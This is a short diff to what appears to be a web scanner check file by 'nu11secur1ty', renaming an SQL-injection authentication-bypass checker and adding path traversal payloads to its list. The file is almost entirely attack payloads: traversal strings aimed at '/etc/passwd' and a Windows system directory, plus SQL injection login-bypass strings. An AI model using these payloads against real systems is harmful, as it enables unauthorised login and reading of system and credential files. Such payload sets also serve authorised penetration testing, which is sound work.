@@ -1,11 +1,14 @@
 metadata:
     language: v2-beta
-    name: "SQLi Checker"
+    name: "SQLi&Path_traversal_Checker"
     description: "Bypass authentication SQLi"
     author: "nu11secur1ty"
 
 run for each:
     payloadSet =
+        ".../..../../../",
+        "../../../../../../../../etc/passwd",
+        "../../.../../../../C:/Windows/",
         "'='",
         "'LIKE'",
         "'=0--+",
